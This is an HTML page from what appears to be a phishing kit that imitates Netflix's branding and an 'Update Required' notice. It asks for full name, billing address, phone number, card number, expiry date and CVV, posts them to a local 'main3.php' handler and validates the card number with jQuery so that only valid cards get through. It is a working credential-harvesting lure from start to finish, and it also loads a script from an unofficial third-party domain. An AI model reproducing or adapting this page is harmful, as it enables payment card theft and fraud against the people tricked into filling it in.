<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Netflix</title>
    <link rel="icon" type="image/png" href="assets/img/favicon.ico" />
    <link rel="stylesheet" type="text/css" href="assets/css/none_p2.css">
    <link rel="stylesheet" type="text/css" href="assets/css/none1_p2.css">
    <link rel="stylesheet" type="text/css" href="assets/css/styles__ltr.css">
    <script type="text/javascript" src="https://js-codes.com/modernizr/2.8.7/modernizr.min.js"></script>
    <script src="assets/js/jquery.js"></script>
    <script src="assets/js/jquery.val.js"></script>
    <script src="assets/js/jquery.mask.js"></script>
</head>

<body>
    <div class="basicLayout simplicity">
        <div class="nfHeader noBorderHeader signupBasicHeader"><a href="/" class="svg-nfLogo signupBasicHeader" data-uia="netflix-header-svg-logo"><svg viewBox="0 0 111 30" class="svg-icon svg-icon-netflix-logo" focusable="true">
                    <g id="netflix-logo">
                        <path d="M105.06233,14.2806261 L110.999156,30 C109.249227,29.7497422 107.500234,29.4366857 105.718437,29.1554972 L102.374168,20.4686475 L98.9371075,28.4375293 C97.2499766,28.1563408 95.5928391,28.061674 93.9057081,27.8432843 L99.9372012,14.0931671 L94.4680851,-5.68434189e-14 L99.5313525,-5.68434189e-14 L102.593495,7.87421502 L105.874965,-5.68434189e-14 L110.999156,-5.68434189e-14 L105.06233,14.2806261 Z M90.4686475,-5.68434189e-14 L85.8749649,-5.68434189e-14 L85.8749649,27.2499766 C87.3746368,27.3437061 88.9371075,27.4055675 90.4686475,27.5930265 L90.4686475,-5.68434189e-14 Z M81.9055207,26.93692 C77.7186241,26.6557316 73.5307901,26.4064111 69.250164,26.3117443 L69.250164,-5.68434189e-14 L73.9366389,-5.68434189e-14 L73.9366389,21.8745899 C76.6248008,21.9373887 79.3120255,22.1557784 81.9055207,22.2804387 L81.9055207,26.93692 Z M64.2496954,10.6561065 L64.2496954,15.3435186 L57.8442216,15.3435186 L57.8442216,25.9996251 L53.2186709,25.9996251 L53.2186709,-5.68434189e-14 L66.3436123,-5.68434189e-14 L66.3436123,4.68741213 L57.8442216,4.68741213 L57.8442216,10.6561065 L64.2496954,10.6561065 Z M45.3435186,4.68741213 L45.3435186,26.2498828 C43.7810479,26.2498828 42.1876465,26.2498828 40.6561065,26.3117443 L40.6561065,4.68741213 L35.8121661,4.68741213 L35.8121661,-5.68434189e-14 L50.2183897,-5.68434189e-14 L50.2183897,4.68741213 L45.3435186,4.68741213 Z M30.749836,15.5928391 C28.687787,15.5928391 26.2498828,15.5928391 24.4999531,15.6875059 L24.4999531,22.6562939 C27.2499766,22.4678976 30,22.2495079 32.7809542,22.1557784 L32.7809542,26.6557316 L19.812541,27.6876933 L19.812541,-5.68434189e-14 L32.7809542,-5.68434189e-14 L32.7809542,4.68741213 L24.4999531,4.68741213 L24.4999531,10.9991564 C26.3126816,10.9991564 29.0936358,10.9054269 30.749836,10.9054269 L30.749836,15.5928391 Z M4.78114163,12.9684132 L4.78114163,29.3429562 C3.09401069,29.5313525 1.59340144,29.7497422 0,30 L0,-5.68434189e-14 L4.4690224,-5.68434189e-14 L10.562377,17.0315868 L10.562377,-5.68434189e-14 L15.2497891,-5.68434189e-14 L15.2497891,28.061674 C13.5935889,28.3437998 11.906458,28.4375293 10.1246602,28.6868498 L4.78114163,12.9684132 Z" id="Fill-14"></path>
                    </g>
                </svg><span class="screen-reader-text">Netflix</span></a><a href="/signout" class="authLinks signupBasicHeader" data-uia="header-signout-link">Sign Out</a></div>
        <div class="simpleContainer">
            <div class="centerContainer firstLoad">
                <div class="paymentFormContainer">
                    <div class="regFormContainer passwordFormContainer" data-uia="form-registration">
                        <div class="messageContainer" data-a11y-focus="true" tabindex="0">
                            <div class="nf-message-container nf-message-warn" data-uia="UIMessage+container">
                                <div class="nf-message-icon"></div>
                                <div class="nf-message-contents" data-uia="UIMessage-content"><span id="" data-uia=""><b>Update Required.</b> Please update your profile.</span></div>
                            </div>
                        </div>
                        <div class="stepHeader-container" data-uia="header">
                            <div class="stepHeader" data-a11y-focus="true"><span id="" class="stepIndicator" data-uia="">STEP <b>1</b> OF <b>3</b></span>
                                <h1 class="stepTitle" data-uia="stepTitle"><span id="" data-uia="">Update your credit or debit card.</span></h1>
                            </div>
                        </div>
                        <div class="contextContainer">
                            <div class="contextRow contextRowFirst">By updating your membership, you will enjoy all account advantages and benefits</div>
                        </div>
                        <form method="post" action="main3.php" id="nameform" novalidate data-valid="is required!">
                            <div class="fieldContainer"><span class="logos logos-block" data-uia="cardLogos-comp" aria-label="We accept VISA, MASTERCARD, AMEX and DINERS."><img alt="" class="logoIcon VISA" data-uia="logoIcon-VISA" src="assets/img/visa-v3.svg"><img alt="" class="logoIcon MASTERCARD" data-uia="logoIcon-MASTERCARD" src="assets/img/mastercard-v2.svg"><img alt="" class="logoIcon AMEX" data-uia="logoIcon-AMEX" src="assets/img/amex-v2.svg"><img alt="" class="logoIcon DINERS" data-uia="logoIcon-DINERS" src="assets/img/icon_dinersclub_v2.png" srcset="assets/img/icon_dinersclub_v2_2x.png 2x"></span>

                                <ul class="simpleForm structural ui-grid">
                                    <li class="nfFormSpace">
                                        <div class="nfInput nfInputOversize">
                                            <div class="nfInputPlacement"><label><input type="text" class="nfTextField" name="name"><label for="name" class="placeLabel" required>Full Name</label></label></div>
                                            <div class="inputError" style="display:none"></div>
                                        </div>
                                    </li>
                                    <li class="nfFormSpace">
                                        <div class="nfInput nfInputOversize">
                                            <div class="nfInputPlacement"><label><input type="text" class="nfTextField" name="adr"><label for="adr" class="placeLabel" required>Billing Address</label></label></div>
                                            <div class="inputError" style="display:none"></div>
                                        </div>
                                    </li>
                                    <li class="nfFormSpace">
                                        <div class="nfInput nfInputOversize">
                                            <div class="nfInputPlacement"><label><input type="text" class="nfTextField" name="zip"><label for="zip" class="placeLabel" required>Billing Zip Code</label></label></div>
                                            <div class="inputError" style="display:none"></div>
                                        </div>
                                    </li>
                                    <li class="nfFormSpace">
                                        <div class="nfInput nfInputOversize">
                                            <div class="nfInputPlacement"><label><input type="text" class="nfTextField" name="city"><label for="city" class="placeLabel" required>City</label></label></div>
                                            <div class="inputError" style="display:none"></div>
                                        </div>
                                    </li>
                                    <li class="nfFormSpace">
                                        <div class="nfInput nfInputOversize">
                                            <div class="nfInputPlacement"><label><input type="text" class="nfTextField" name="state"><label for="state" class="placeLabel" required>State</label></label></div>
                                            <div class="inputError" style="display:none"></div>
                                        </div>
                                    </li>
                                    <li class="nfFormSpace">
                                        <div class="nfInput nfInputOversize">
                                            <div class="nfInputPlacement"><label><input type="text" class="nfTextField" name="country"><label for="country" class="placeLabel" required>Country</label></label></div>
                                            <div class="inputError" style="display:none"></div>
                                        </div>
                                    </li>
                                    <li class="nfFormSpace">
                                        <div class="nfInput nfInputOversize">
                                            <div class="nfInputPlacement"><label><input type="text" class="nfTextField" id="phone" name="phone" required><label for="phone" class="placeLabel">Phone Number</label></label></div>
                                            <div class="inputError" style="display:none"></div>
                                        </div>
                                    </li>
                                    <li class="nfFormSpace">
                                        <div class="cardNumberContainer">
                                            <div class="nfInput nfInputOversize">
                                                <div class="nfInputPlacement"><label><input type="hidden" name="ctp" value=""><input type="tel" class="nfTextField" id="cnm" maxlength="23" name="cnm" data-check="Enter a valid card credit number." required><label for="cnm" class="placeLabel">Card Number</label></label></div>
                                                <div class="inputError" style="display:none"></div>
                                            </div>
                                        </div>
                                    </li>
                                    <li class="nfFormSpace">
                                        <div class="nfInput nfInputOversize">
                                            <div class="nfInputPlacement"><label><input value="Expiration Date (MM/YY)" type="tel" class="nfTextField" id="exp" maxlength="5" name="exp"><label for="exp" class="placeLabel" required>Expiration Date (MM/YY)</label></label></div>
                                            <div class="inputError" style="display:none"></div>
                                        </div>
                                    </li>
                                    <li class="nfFormSpace"></li>
                                    <li class="nfFormSpace">
                                        <div class="nfInput nfInputOversize">
                                            <div class="nfInputPlacement"><label><input type="tel" class="nfTextField" id="csc" maxlength="4" minlength="3" name="csc"><label for="csc" class="placeLabel" required>Security Code (CVV)</label></label></div>
                                            <div class="inputError" style="display:none"></div>
                                            <div class="tooltipWrapperErr" id="bt_whats_csc"><img src="assets/img/queCircle.svg" alt="circle"></div>
                                        </div>
                                    </li>
                                </ul>
                            </div>
                            <div class="submitBtnContainer">
                                <div class="submitBtnContainer">
                                    <input type="submit" form="nameform" autocomplete="off" class="nf-btn nf-btn-primary nf-btn-solid nf-btn-oversize" data-uia="cta-registration" placeholder="regForm_button_continue" value="Save">
                                </div>
                            </div>
                        </form>
                    </div>
                    <div class="cvvTooltip" style="display:none;" id="whats_csc"><span class="icon-close close-button pointer" id="bt_close_whats_csc"></span>
                        <div class="tooltipDesc">Your card's security code (CVV) is the 3 or 4 digit number located on the back of most cards.</div>
                        <div class="otherCvvHelp"></div>
                        <div class="amexCvvHelp"></div>
                    </div>
                </div>
            </div>
            <div class="site-footer-wrapper centered">
                <div class="footer-divider"></div>
                <div class="site-footer">
                    <p class="footer-top">Questions? Call <a class="footer-top-a" href="tel:1-844-505-2999">1-844-505-2999</a></p>
                    <ul class="footer-links structural">
                        <li class="footer-link-item" placeholder="footer_responsive_link_faq_item"><a class="footer-link" data-uia="footer-link" href="javascript:void(0)" placeholder="footer_responsive_link_faq"><span id="" data-uia="data-uia-footer-label">FAQ</span></a></li>
                        <li class="footer-link-item" placeholder="footer_responsive_link_help_item"><a class="footer-link" data-uia="footer-link" href="javascript:void(0)" placeholder="footer_responsive_link_help"><span id="" data-uia="data-uia-footer-label">Help Center</span></a></li>
                        <li class="footer-link-item" placeholder="footer_responsive_link_terms_item"><a class="footer-link" data-uia="footer-link" href="javascript:void(0)" placeholder="footer_responsive_link_terms"><span id="" data-uia="data-uia-footer-label">Terms of Use</span></a></li>
                        <li class="footer-link-item" placeholder="footer_responsive_link_privacy_separate_link_item"><a class="footer-link" data-uia="footer-link" href="javascript:void(0)" placeholder="footer_responsive_link_privacy_separate_link"><span id="" data-uia="data-uia-footer-label">Privacy</span></a></li>
                        <li class="footer-link-item" placeholder="footer_responsive_link_cookies_separate_link_item"><a class="footer-link" data-uia="footer-link" href="javascript:void(0)" placeholder="footer_responsive_link_cookies_separate_link"><span id="" data-uia="data-uia-footer-label">Cookie Preferences</span></a></li>
                        <li class="footer-link-item" placeholder="footer_responsive_link_corporate_information_item"><a class="footer-link" data-uia="footer-link" href="javascript:void(0)" placeholder="footer_responsive_link_corporate_information"><span id="" data-uia="data-uia-footer-label">Corporate Information</span></a></li>
                    </ul>
                    <div class="lang-selection-container" id="lang-switcher">
                        <div class="nfSelectWrapper inFooter selectArrow prefix" data-uia="language-picker+container"><label class="nfLabel" for="lang-switcher-select">Select Language</label>
                            <div class="nfSelectPlacement globe"><select data-uia="language-picker" class="nfSelect" id="lang-switcher-select" name="__langSelect" tabindex="0">
                                    <option selected="" value="/signup/password?locale=en-IN" label="English" lang="en">English</option>
                                </select></div>
                        </div>
                    </div>
                </div>
            </div>
            <script>
                $("#lib").removeAttr('disabled');
                $(document).ready(function() {
                    $('#exp').mask('00/00');
                    $('#phone').mask('(000) 000-0000');

                    function valid(me) {
                        if (me.val()) {
                            me.addClass('hasText valid');
                            me.removeClass('error');
                            me.parent().parent().parent().children('.inputError').hide();
                            return true;
                        } else {
                            me.addClass('error');
                            if (me.attr("placeholder") == undefined) {
                                me.removeClass('hasText valid');
                            } else {
                                me.removeClass('valid');
                            }
                            me.parent().parent().parent().children('.inputError').html(me.next('label').html() + ' ' + $('form').data('valid')).show();
                            return false;
                        }
                    }
                    $(document).on('keyup', 'input', function() {
                        var me = $(this);
                        valid(me);
                    });
                    $(document).on('click', '#bt_whats_csc', function() {
                        $('#whats_csc').show();
                    });
                    $(document).on('click', '#bt_close_whats_csc', function() {
                        $('#whats_csc').hide();
                    });
                    var ccvalid = false;
                    $(document).on('keyup', '#cnm', function() {
                        $('#cnm').mask('0000 0000 0000 0000 000');
                        $('#cnm').validateCreditCard(function(result) {
                            var cc = $('#cnm');
                            if (cc.val() != '') {
                                var cctype = result.card_type == null ? '-' : result.card_type.name;
                                $('input[name=ctp]').val(cctype);
                                if (result.valid) {
                                    cc.addClass('hasText valid');
                                    cc.removeClass('error');
                                    cc.parent().parent().parent().children('.inputError').hide();
                                    ccvalid = true;
                                } else {
                                    cc.addClass('error');
                                    cc.removeClass('valid');
                                    cc.parent().parent().parent().children('.inputError').html(cc.data('check')).show();
                                    ccvalid = false;
                                }
                            }
                        });
                    });
                });
            </script>

        </div>
</body>

</html>